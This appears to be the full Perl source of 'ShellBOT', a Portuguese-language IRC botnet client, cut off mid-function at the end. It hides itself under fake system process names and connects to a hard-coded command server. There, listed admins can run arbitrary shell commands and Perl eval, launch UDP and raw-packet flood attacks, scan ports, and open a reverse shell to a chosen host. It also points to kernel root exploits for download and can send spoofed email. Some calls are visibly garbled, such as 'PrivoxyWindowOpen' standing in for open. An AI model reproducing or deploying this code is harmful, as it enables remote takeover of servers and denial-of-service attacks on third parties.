#!/usr/bin/perl
#
#  ShellBOT by: devil__
#       Greetz: Puna, Kelserific
#
# Comandos:
#           @oldpack <ip> <bytes> <tempo>;
#           @udp <ip> <porta> <tempo>;
#           @fullportscan <ip> <porta inicial> <porta final>;
#           @conback <ip> <porta>
#           @download <url> <arquivo a ser salvo>;
#           !estatisticas <on/off>;
#           !sair para finalizar o bot;
#           !novonick para trocar o nick do bot por um novo aleatorio;
#           !entra <canal> <tempo>
#           !sai <canal> <tempo>;
#           !pacotes <on/off>
#           @info
#	    @xpl <kernel>
#	    @sendmail <assunto> <remetente> <destinatario> <conteudo>

########## CONFIGURACAO ############

my @ps = ("/usr/local/apache/bin/httpd -DSSL","/sbin/syslogd","[eth0]","/sbin/klogd -c 1 -x -x","/usr/sbin/acpid","/usr/sbin/cron","[bash]");
my $processo = $ps[rand scalar @ps];

$servidor='67.225.132.46' unless $servidor;
my $porta='7000';
my @canais=("#bot");
my @adms=("xSenha","mendes_rs");

# Anti Flood ( 6/3 Recomendado )
my $linas_max=10;
my $sleep=5;

my $nick = getnick();
my $ircname = getident2();
my $realname = "Israel Defense Forces";
#chop (my $realname = `Israel Defense Forces`);

my $acessoshell = 1;
######## Stealth ShellBot ##########
my $prefixo = "!all";
my $estatisticas = 1;
my $pacotes = 1;
####################################

my $VERSAO = '0.1b';

$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';

use IO::Socket;
use Socket;
use IO::Select;
chdir("/");
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."�";
my $pid=fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);

my %irc_servers;
my %DCC;
my $dcc_sel = new IO::Select->new();

#####################
# Stealth Shellbot  #
#####################

sub getnick {
  return "Fuck|".(int(rand(1000)));
}

sub getident2 {
        my $length=shift;
        $length = 3 if ($length < 3);

        my @chars=('a'..'z','A'..'Z','1'..'9');
        foreach (1..$length)
        {
                $randomstring.=$chars[rand @chars];
        }
        return $randomstring;
}

#############################
#  B0tchZ na veia ehehe :P  #
#############################

$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]n";
  } else {
      print $IRC_cur_socket "$_[0]n";
  }
}

sub conectar {
   my $meunick = $_[0];
   my $servidor_con = $_[1];
   my $porta_con = $_[2];

   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con", PeerPort=>$porta_con) or return(1);
   if (defined($IRC_socket)) {
     $IRC_cur_socket = $IRC_socket;

     $IRC_socket->autoflush(1);
     $sel_cliente->add($IRC_socket);

     $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
     $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
     nick("$meunick");
     sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
     print "nShellBot $VERSAO by: Haddemn";
     print "nick: $nickn";
     print "servidor: $servidornn";
     sleep 2;
   }

}
my $line_temp;
while( 1 ) {
   while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
   delete($irc_servers{''}) if (defined($irc_servers{''}));
   &DCC::connections;
   my @ready = $sel_cliente->can_read(0.6);
   next unless(@ready);
   foreach $fh (@ready) {
     $IRC_cur_socket = $fh;
     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
     $nread = sysread($fh, $msg, 4096);
     if ($nread == 0) {
        $sel_cliente->remove($fh);
        $fh->close;
        delete($irc_servers{$fh});
     }
     @lines = split (/n/, $msg);

     for(my $c=0; $c<= $#lines; $c++) {
       $line = $lines[$c];
       $line=$line_temp.$line if ($line_temp);
       $line_temp='';
       $line =~ s/r$//;
       unless ($c == $#lines) {
         parse("$line");
       } else {
           if ($#lines == 0) {
             parse("$line");
           } elsif ($lines[$c] =~ /r$/) {
               parse("$line");
           } elsif ($line =~ /^(S+) NOTICE AUTH :***/) {
               parse("$line");
           } else {
               $line_temp = $line;
           }
       }
      }
   }
}

sub parse {
   my $servarg = shift;
   if ($servarg =~ /^PING :(.*)/) {
     sendraw("PONG :$1");
   } elsif ($servarg =~ /^:(.+?)!(.+?)@(.+?) PRIVMSG (.+?) :(.+)/) {
       my $pn=$1; my $onde = $4; my $args = $5;
       if ($args =~ /^�01VERSION�01$/) {
         notice("$pn", "�01VERSION mIRC v6.16 Khaled Mardam-Bey�01");
       }
       elsif ($args =~ /^�01PINGs+(d+)�01$/) {
         notice("$pn", "�01PONG�01");
       }
       elsif (grep {$_ =~ /^Q$pnE$/i } @adms) {
         if ($onde eq "$meunick"){
           shell("$pn", "$args");
         }
         elsif ($args =~ /^(Q$meunickE|Q$prefixoE)s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
            if ($arg =~ /^!(.*)/) {
              ircase("$pn","$onde","$1") unless ($natrix eq "$prefixo" and $arg =~ /^!nick/);
            } elsif ($arg =~ /^@(.*)/) {
                $ondep = $onde;
                $ondep = $pn if $onde eq $meunick;
                bfunc("$ondep","$1");
            } else {
                shell("$onde", "$arg");
            }
         }
       }
   } elsif ($servarg =~ /^:(.+?)!(.+?)@(.+?)s+NICKs+:(S+)/i) {
       if (lc($1) eq lc($meunick)) {
         $meunick=$4;
         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       }
   } elsif ($servarg =~ m/^:(.+?)s+433/i) {
       $meunick = getnick();
       nick("$meunick");
   } elsif ($servarg =~ m/^:(.+?)s+001s+(S+)s/i) {
       $meunick = $2;
       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
       foreach my $canal (@canais) {
         sendraw("JOIN $canal");
       }
   }
}

sub bfunc {
  my $printl = $_[0];
  my $funcarg = $_[1];
  if (my $pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           if ($funcarg =~ /^portscan (.*)/) {
             my $hostip="$1";
             my @portas=("21","22","23","25","53","59","79","80","110","113","135","139","443","445","1025","5000","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","8080","8018");
             my (@aberta, %porta_banner);
             foreach my $porta (@portas)  {
                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);
                if ($scansock) {
                   push (@aberta, $porta);
                   $scansock->close;
                }
             }
             if (@aberta) {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :Portas abertas: @aberta");
             } else {
                 sendraw($IRC_cur_socket,"PRIVMSG $printl :Nenhuma porta aberta foi encontrada.");
             }
           }

           #elsif ($funcarg =~ /^downloads+(.*)s+(.*)/) {
           # getstore("$1", "$2");
           # sendraw($IRC_cur_socket, "PRIVMSG $printl :Download de $2 ($1) Concluído!");
           # }

           elsif ($funcarg =~ /^fullportscans+(.*)s+(d+)s+(d+)/) {
             my $hostname="$1";
             my $portainicial = "$2";
             my $portafinal = "$3";
             my (@abertas, %porta_banner);
             foreach my $porta ($portainicial..$portafinal)
             {
               my $scansock = IO::Socket::INET->new(PeerAddr => $hostname, PeerPort => $porta, Proto => 'tcp', Timeout => 4);
               if ($scansock) {
                 push (@abertas, $porta);
                 $scansock->close;
                 sendraw($IRC_cur_socket, "PRIVMSG $printl :Porta $porta aberta em $hostname");
               }
             }
             if (@abertas) {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :Portas abertas: @abertas");
             } else {
               sendraw($IRC_cur_socket,"PRIVMSG $printl :Nenhuma porta aberta foi encontrada.");
             }
            }

            # Duas Versões simplificada do meu Tr0x ;D
            elsif ($funcarg =~ /^udps+(.*)s+(d+)s+(d+)/) {
              return unless $pacotes;
              socket(Tr0x, PF_INET, SOCK_DGRAM, 17);
              my $alvo=inet_aton("$1");
              my $porta = "$2";
              my $tempo = "$3";
	      sendraw($IRC_cur_socket, "PRIVMSG $printl :�02pacotando�02: $1 �02tempo�02: $tempo");
              my $pacote;
              my $pacotese;
              my $fim = time + $tempo;
              my $pacota = 1;
              while (($pacota == "1")) {
                $pacota = 0 if ((time >= $fim) && ($tempo != "0"));
                $pacote=$rand x $rand x $rand;
                $porta = int(rand 65000) +1 if ($porta == "0");
                send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++;
              }
               #sendraw($IRC_cur_socket, "PRIVMSG $printl :�02Tempo de Pacotes�02: $tempo"."s");
               #sendraw($IRC_cur_socket, "PRIVMSG $printl :�02Total de Pacotes�02: $pacotese");
               sendraw($IRC_cur_socket, "PRIVMSG $printl :�02pacotado�02: $1 �02tempo�02: $tempo"."segs �02pacotes�02: $pacotese");
            }

            elsif ($funcarg =~ /^udpfaixas+(.*)s+(d+)s+(d+)/) {
              sendraw($IRC_cur_socket, "PRIVMSG $printl :�02aviso�02: @udpfaixa foi removido do bot");
	      exit;
              return unless $pacotes;
              socket(Tr0x, PF_INET, SOCK_DGRAM, 17);
              my $faixaip="$1";
              my $porta = "$2";
              my $tempo = "$3";
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :�02Pacotando�02: $1 �02tempo�02: $tempo");
              my $pacote;
              my $pacotes;
              my $fim = time + $tempo;
              my $pacota = 1;
              my $alvo;
              while ($pacota == "1") {
                $pacota = 0 if ((time >= $fim) && ($tempo != "0"));
                for (my $faixa = 1; $faixa <= 255; $faixa++) {
                  $alvo = inet_aton("$faixaip.$faixa");
                  $pacote=$rand x $rand x $rand;
                  $porta = int(rand 65000) +1 if ($porta == "0");
                  send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++;
                  if ($faixa >= 255) {
                    $faixa = 1;
                  }
                }
              }
               #sendraw($IRC_cur_socket, "PRIVMSG $printl :�02Tempo de Pacotes�02: $tempo"."s");
               #sendraw($IRC_cur_socket, "PRIVMSG $printl :�02Total de Pacotes�02: $pacotese");
               sendraw($IRC_cur_socket, "PRIVMSG $printl :�02faixa�02: $1"."1-"."$2"."255 �02tempo�02: $tempo"."segs �02pacotes�02: $pacotese");
            }

            # Conback.pl by Dominus Vis adaptada e adicionado suporte pra windows ;p
            elsif ($funcarg =~ /^conbacks+(.*)s+(d+)/) {
              my $host = "$1";
              my $porta = "$2";
              sendraw($IRC_cur_socket, "PRIVMSG $printl :�02Conectando-se em�02: $host:$porta");
              my $proto = getprotobyname('tcp');
              my $iaddr = inet_aton($host);
              my $paddr = sockaddr_in($porta, $iaddr);
              my $shell = "/bin/sh -i";
              if ($^O eq "MSWin32") {
                $shell = "cmd.exe";
              }
              socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
              connect(SOCKET, $paddr) or die "connect: $!";
              PrivoxyWindowOpen(STDIN, ">&SOCKET");
              PrivoxyWindowOpen(STDOUT, ">&SOCKET");
              PrivoxyWindowOpen(STDERR, ">&SOCKET");
              system("$shell");
              close(STDIN);
              close(STDOUT);
              close(STDERR);
            }

           elsif ($funcarg =~ /^oldpacks+(.*)s+(d+)s+(d+)/) {
            return unless $pacotes;
             my ($dtime, %pacotes) = attacker("$1", "$2", "$3");
             $dtime = 1 if $dtime == 0;
             my %bytes;
             $bytes{igmp} = $2 * $pacotes{igmp};
             $bytes{icmp} = $2 * $pacotes{icmp};
             $bytes{o} = $2 * $pacotes{o};
             $bytes{udp} = $2 * $pacotes{udp};
             $bytes{tcp} = $2 * $pacotes{tcp};
               sendraw($IRC_cur_socket, "PRIVMSG $printl :�02 - Status GERAL -�02");
               sendraw($IRC_cur_socket, "PRIVMSG $printl :�02Tempo�02: $dtime"."s");
               sendraw($IRC_cur_socket, "PRIVMSG $printl :�02Total pacotes�02: ".($pacotes{udp} + $pacotes{igmp} + $pacotes{icmp} +  $pacotes{o}));
               sendraw($IRC_cur_socket, "PRIVMSG $printl :�02Total bytes�02: ".($bytes{icmp} + $bytes {igmp} + $bytes{udp} + $bytes{o}));
               sendraw($IRC_cur_socket, "PRIVMSG $printl :�02Média de envio�02: ".int((($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)/$dtime)." kbps");
           }
           elsif ($funcarg =~ /^xpls+(.*)/) {
           my $kernel = "$1";
           if ($kernel =~ /2.4.17/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: newlocal, kmod, uselib24"); goto downloads; }
           if ($kernel =~ /2.4.18/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: newlocal, kmod, brk, brk2"); goto downloads; }
           if ($kernel =~ /2.4.19/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: kmod, newlocal, w00t, brkm brk2"); goto downloads; }
           if ($kernel =~ /2.4.20/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: kmod, kmod2, newlocal, w00t, ptrace, ptrace-kmod, brk, brk2"); goto downloads; }
           if ($kernel =~ /2.4.21/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: brk, brk2, ptrace, ptrace-kmod, uselib24, elflbl"); goto downloads; }
           if ($kernel =~ /2.4.22/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: brk, brk2, ptrace, ptrace-kmod, uselib24, elflbl, mremap_pte, loginx"); goto downloads; }
           if ($kernel =~ /2.4.23/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: uselib24, elflbl, mremap_pte"); goto downloads; }
           if ($kernel =~ /2.4.24/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: uselib24, elflbl, mremap_pte"); goto downloads; }
           if ($kernel =~ /2.4.25/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: uselib24, elflbl"); goto downloads; }
           if ($kernel =~ /2.4.26/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: uselib24, elflbl"); goto downloads; }
           if ($kernel =~ /2.4.27/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: uselib24, elflbl"); goto downloads; }
           if ($kernel =~ /2.4.28/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: uselib24, elflbl"); goto downloads; }
           if ($kernel =~ /2.6.0/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: wuftpd, h00lyshit"); goto downloads; }
           if ($kernel =~ /2.6.2/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: mremap_pte, krad, h00lyshit"); goto downloads; }
           if ($kernel =~ /2.6.5/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: krad, krad2, h00lyshit"); goto downloads; }
           if ($kernel =~ /2.6.6/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: krad, krad2, h00lyshit"); goto downloads; }
           if ($kernel =~ /2.6.7/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: krad2, h00lyshit"); goto downloads; }
           if ($kernel =~ /2.6.8/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: krad2, h00lyshit"); goto downloads; }
           if ($kernel =~ /2.6.9/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: krad2, h00lyshit, r00t"); goto downloads; }
           if ($kernel =~ /2.6.10/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: krad2, h00lyshit"); goto downloads; }
           if ($kernel =~ /2.6.11/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: h00lyshit, k-rad3"); goto downloads; }
           if ($kernel =~ /2.6.12/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: h00lyshit"); goto downloads; }
           if ($kernel =~ /2.6.13/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: raptor, raptor2, h00lyshit, solpot, prctl"); goto downloads; }
           if ($kernel =~ /2.6.14/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: raptor, raptor2, h00lyshit, solpot, prctl"); goto downloads; }
           if ($kernel =~ /2.6.15/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: raptor, raptor2, h00lyshit, solpot, prctl"); goto downloads; }
           if ($kernel =~ /2.6.16/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: raptor, raptor2, h00lyshit, solpot, prctl"); goto downloads; }
           if ($kernel =~ /2.6.17/) { sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: raptor, raptor2, h00lyshit, solpot, prctl"); goto downloads; }
           sendraw($IRC_cur_socket, "PRIVMSG $printl : kernel $kernel rootab with: nothing =)");
           exit;
           downloads:
           sendraw($IRC_cur_socket, "PRIVMSG $printl : downloads: 12http://dvl.by.ru/xpl");
           }
           elsif ($funcarg =~ /^info/) {
           my $sysos = `uname -sr`;
           my $uptime = `uptime`;
           if ( $sysos =~ /freebsd/i ) {
           $sysname = `hostname`;
           $memory = `expr `cat /var/run/dmesg.boot | grep "real memory" | cut -f5 -d" "` / 1048576`;
           $swap = `$toploc | grep -i swap | cut -f2 -d" " | cut -f1 -d"M"`;
           chomp($memory);
           chomp($swap);
           }
           elsif ( $sysos =~ /linux/i ) {
           $sysname = `hostname -f`;
           $memory = `free -m |grep -i mem | awk '{print $2}'`;
           $swap = `free -m |grep -i swap | awk '{print $2}'`;
           chomp($swap);
           chomp($memory);
           }
           else {
           $sysname ="Not Found";;
           $memory ="Not found";
           $swap ="Not Found";
           }
           sendraw($IRC_cur_socket, "PRIVMSG $printl : 15--- 3[01 SysInfo 3] 15-------------");
           sendraw($IRC_cur_socket, "PRIVMSG $printl : 01os/host15;01 $sysos - $sysname ");
           sendraw($IRC_cur_socket, "PRIVMSG $printl : 01proc/PID15;01 $processo - $$");
           sendraw($IRC_cur_socket, "PRIVMSG $printl : 01uptime15;01 $uptime");
           sendraw($IRC_cur_socket, "PRIVMSG $printl : 01memory/swap15;01 $memory - $swap");
           sendraw($IRC_cur_socket, "PRIVMSG $printl : 01perl/bot15;01 $] - $VERSAO");
           sendraw($IRC_cur_socket, "PRIVMSG $printl : 15--- 3[01 /SysInfo 3] 15------------");
           }
           elsif($funcarg =~ /^sendmails+(.*)s+(.*)s+(.*)s+(.*)/) {
           sendraw($IRC_cur_socket, "PRIVMSG $printl : 01Enviando e-mail para: $3");
           $subject = $1;
           $sender = $2;
           $recipient = $3;
           @corpo = $4;
           $mailtype = "content-type: text/html";
           $sendmail = '/usr/sbin/sendmail';
           PrivoxyWindowOpen(SENDMAIL, "| $sendmail -t");
           print SENDMAIL "$mailtypen";
           print SENDMAIL "Subject: $subjectn";
           print SENDMAIL "From: $sendern";
           print SENDMAIL "To: $recipientnn";
           print SENDMAIL "@corponn";
           close (SENDMAIL);
           sendraw($IRC_cur_socket, "PRIVMSG $printl :01email enviado para: $recipient");
           }
           exit;
    }
  }
}

sub ircase {
  my ($kem, $printl, $case) = @_;

   if ($case =~ /^join (.*)/) {
     j("$1");
   }
   elsif ($case =~ /^part (.*)/) {
      p("$1");
   }
   elsif ($case =~ /^rejoins+(.*)/) {
      my $chan = $1;
      if ($chan =~ /^(d+) (.*)/) {
        for (my $ca = 1; $ca <= $1; $ca++ ) {
          p("$2");
          j("$2");
        }
      } else {
          p("$chan");
          j("$chan");
      }
   }
   elsif ($case =~ /^op/) {
      op("$printl", "$kem") if $case eq "op";
      my $oarg = substr($case, 3);
      op("$1", "$2") if ($oarg =~ /(S+)s+(S+)/);
   }
   elsif ($case =~ /^deop/) {
      deop("$printl", "$kem") if $case eq "deop";
      my $oarg = substr($case, 5);
      deop("$1", "$2") if ($oarg =~ /(S+)s+(S+)/);
   }
   elsif ($case =~ /^voice/) {
      voice("$printl", "$kem") if $case eq "voice";
      $oarg = substr($case, 6);
      voice("$1", "$2") if ($oarg =~ /(S+)s+(S+)/);
   }
   elsif ($case =~ /^devoice/) {
      devoice("$printl", "$kem") if $case eq "devoice";
      $oarg = substr($case, 8);
      devoice("$1", "$2") if ($oarg =~ /(S+)s+(S+)/);
   }
   elsif ($case =~ /^msgs+(S+) (.*)/) {
      msg("$1", "$2");
   }
   elsif ($case =~ /^floods+(d+)s+(S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        msg("$2", "$3");
      }
   }
   elsif ($case =~ /^ctcpfloods+(d+)s+(S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        ctcp("$2", "$3");
      }
   }
   elsif ($case =~ /^ctcps+(S+) (.*)/) {
      ctcp("$1", "$2");
   }
   elsif ($case =~ /^invites+(S+) (.*)/) {
      invite("$1", "$2");
   }
   elsif ($case =~ /^nick (.*)/) {
      nick("$1");
   }
   elsif ($case =~ /^conectas+(S+)s+(S+)/) {
       conectar("$2", "$1", 6667);
   }
   elsif ($case =~ /^sends+(S+)s+(S+)/) {
      DCC::SEND("$1", "$2");
   }
   elsif ($case =~ /^raw (.*)/) {
      sendraw("$1");
   }
   elsif ($case =~ /^eval (.*)/) {
      eval "$1";
   }
   elsif ($case =~ /^entras+(S+)s+(d+)/) {
    sleep int(rand($2));
    j("$1");
   }
   elsif ($case =~ /^sais+(S+)s+(d+)/) {
    sleep int(rand($2));
    p("$1");
   }
   elsif ($case =~ /^sair/) {
     quit();
   }
   elsif ($case =~ /^novonick/) {
    my $novonick = getnick();
     nick("$novonick");
   }
   elsif ($case =~ /^estatisticas (.*)/) {
     if ($1 eq "on") {
      $estatisticas = 1;
      msg("$printl", "Estatísticas ativadas!");
     } elsif ($1 eq "off") {
      $estatisticas = 0;
      msg("$printl", "Estatísticas desativadas!");
     }
   }
   elsif ($case =~ /^pacotes (.*)/) {
     if ($1 eq "on") {
      $pacotes = 1;
      msg("$printl", "Pacotes ativados!") if ($estatisticas == "1");
     } elsif ($1 eq "off") {
      $pacotes = 0;
      msg("$printl", "Pacotes desativados!") if ($estatisticas == "1");
     }
   }
}
sub shell {
  return unless $acessoshell;
  my $printl=$_[0];
  my $comando=$_[1];
  if ($comando =~ /cd (.*)/) {
    chdir("$1") || msg("$printl", "Diretório inexistente!");
    return;
  }
  elsif ($pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           my @resp=`$comando 2>&1 3>&1`;
           my $c=0;
           foreach my $linha (@resp) {
             $c++;
             chop $linha;
             sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
             if ($c >= "$linas_max") {
               $c=0;
               sleep $sleep;
             }
           }
           exit;
       }
  }
}

#eu fiz um pacotadorzinhu e talz.. dai colokemo ele aki
sub attacker {
  my $iaddr = inet_aton($_[0]);
  my $msg = 'B' x $_[1];
  my $ftime = $_[2];
  my $cp = 0;
  my (%pacotes);
  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;

  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
  return(undef) if $cp == 4;
  my $itime = time;
  my ($cur_time);
  while ( 1 ) {
     for (my $porta = 1; $porta <= 65535; $porta++) {
       $cur_time = time - $itime;
       last if $cur_time >= $ftime;
       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++ if ($pacotes == 1);
       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++ if ($pacotes == 1);
       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++ if ($pacotes == 1);
       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++ if ($pacotes == 1);

       # DoS ?? :P
       for (my $pc = 3; $pc <= 255;$pc++) {
         next if $pc == 6;
         $cur_time = time - $itime;
         last if $cur_time >= $ftime;
         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++ if ($pacotes == 1);
       }
     }
     last if $cur_time >= $ftime;
  }
  return($cur_time, %pacotes);
}

#############
#  ALIASES  #
#############

sub action {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :�01ACTION $_[1]�01");
}

sub ctcp {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :�01$_[1]�01");
}
sub msg {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :$_[1]");
}

sub notice {
   return unless $#_ == 1;
   sendraw("NOTICE $_[0] :$_[1]");
}

sub op {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +o $_[1]");
}
sub deop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -o $_[1]");
}
sub hop {
    return unless $#_ == 1;
   sendraw("MODE $_[0] +h $_[1]");
}
sub dehop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +h $_[1]");
}
sub voice {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +v $_[1]");
}
sub devoice {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -v $_[1]");
}
sub ban {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +b $_[1]");
}
sub unban {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -b $_[1]");
}
sub kick {
   return unless $#_ == 1;
   sendraw("KICK $_[0] $_[1] :$_[2]");
}

sub modo {
   return unless $#_ == 0;
   sendraw("MODE $_[0] $_[1]");
}
sub mode { modo(@_); }

sub j { &join(@_); }
sub join {
   return unless $#_ == 0;
   sendraw("JOIN $_[0]");
}
sub p { part(@_); }
sub part {sendraw("PART $_[0]");}

sub nick {
  return unless $#_ == 0;
  sendraw("NICK $_[0]");
}

sub invite {
   return unless $#_ == 1;
   sendraw("INVITE $_[1] $_[0]");
}
sub topico {
   return unless $#_ == 1;
   sendraw("TOPIC $_[0] $_[1]");
}
sub topic { topico(@_); }

sub whois {
  sendraw("WHOIS $_[0]");
}
sub who {
  return unless $#_ == 0;
  sendraw("WHO $_[0]");
}
sub names {
  return unless $#_ == 0;
  sendraw("NAMES $_[0]");
}
sub away {
  sendraw("AWAY $_[0]");
}
sub back { away(); }
sub quit {
  sendraw("QUIT :$_[0]");
  exit;
}

# DCC
package DCC;

sub connections {
   my @ready = $dcc_sel->can_read(1);
#   return unless (@ready);
   foreach my $fh (@ready) {
     my $dcctipo = $DCC{$fh}{tipo};
     my $arquivo = $DCC{$fh}{arquivo};
     my $bytes = $DCC{$fh}{bytes};
     my $cur_byte = $DCC{$fh}{curbyte};
     my $nick = $DCC{$fh}{nick};

     my $msg;
     my $nread = sysread($fh, $msg, 10240);

     if ($nread == 0 and $dcctipo =~ /^(get|sendcon)$/) {
        $DCC{$fh}{status} = "Cancelado";
        $DCC{$fh}{ftime} = time;
        $dcc_sel->remove($fh);
        $fh->close;
        next;
     }

     if ($dcctipo eq "get") {
        $DCC{$fh}{curbyte} += length($msg);

        my $cur_byte = $DCC{$fh}{curbyte};

        PrivoxyWindowOpen(FILE, ">> $arquivo");
        print FILE "$msg" if ($cur_byte <= $bytes);
        close(FILE);

        my $packbyte = pack("N", $cur_byte);
        print $fh "$packbyte";

        if ($bytes == $cur_byte) {
           $dcc_sel->remove($fh);
           $fh->close;
           $DCC{$fh}{status} = "Recebido";
           $DCC{$fh}{ftime} = time;
           next;
        }
     } elsif ($dcctipo eq "send") {
          my $send = $fh->accept;
          $send->autoflush(1);
          $dcc_sel->add($send);
          $dcc_sel->remove($fh);
          $DCC{$send}{tipo} = 'sendcon';
          $DCC{$send}{itime} = time;
          $DCC{$send}{nick} = $nick;
          $DCC{$send}{bytes} = $bytes;
          $DCC{$send}{curbyte} = 0;
          $DCC{$send}{arquivo} = $arquivo;
          $DCC{$send}{ip} = $send->peerhost;
          $DCC{$send}{porta} = $send->peerport;
          $DCC{$send}{status} = "Enviando";

          #de cara manda os primeiro 1024 bytes do arkivo.. o resto fik com o sendcon
          open(FILE, "< $arquivo");
          my $fbytes;
          read(FILE, $fbytes, 1024);
          print $send "$fbytes";
          close FILE;
#          delete($DCC{$fh});
     } elsif ($dcctipo eq 'sendcon') {
          my $bytes_sended = unpack("N", $msg);
          $DCC{$fh}{curbyte} = $bytes_sended;
          if ($bytes_sended == $bytes) {
             $fh->close;
             $dcc_sel->remove($fh);
             $DCC{$fh}{status} = "Enviado";
             $DCC{$fh}{ftime} = time;
             next;
          }
          PrivoxyWindowOpen(SENDFILE, "< $arquivo");
          seek(SENDFILE, $bytes_sended, 0);
          my $send_bytes;
          read(SENDFILE, $send_bytes, 1024);
          print $fh "$send_bytes";
          close(SENDFILE);
     }
   }
}


sub SEND {
  my ($nick, $arquivo) = @_;
  unless (-r "$arquivo") {
    return(0);
  }

  my $dccark = $arquivo;
  $dccark =~ s/[.*/](S+)/$1/;

  my $meuip = $::irc_servers{"$::IRC_cur_socket"}{'meuip'};
  my $longip = unpack("N",inet_aton($meuip));

  my @filestat = stat($arquivo);
  my $size_total=$filestat[7];
  if ($size_total == 0) {
     return(0);
  }

  my ($porta, $sendsock);
  do {
    $porta = int rand(64511);
    $porta += 1024;
    $sendsock = IO::Socket::INET->new(Listen=>1, LocalPort =>$porta, Proto => 'tcp') and $dcc_sel->add($sendsock);
  } until $sendsock;

  $DCC{$sendsock}{tipo} = 'send';
  $DCC{$sendsock}{nick} = $nick;
